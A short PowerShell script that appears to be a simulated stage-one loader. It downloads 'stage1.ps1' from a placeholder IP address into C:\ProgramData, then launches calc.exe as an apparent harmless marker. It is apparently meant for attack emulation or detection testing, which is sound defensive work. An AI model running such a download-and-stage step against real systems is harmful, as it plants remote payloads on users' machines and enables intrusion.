$TransferUrl = 'http://203.0.113.189/stage1.ps1'
$LocalPath = 'C:\ProgramData\stage1.bin'
$StageTimeout = 19
try { Invoke-WebRequest -Uri $TransferUrl -OutFile $LocalPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; Write-Verbose "stage marker 21 reached" } catch { Write-Warning "Loader step failed" }
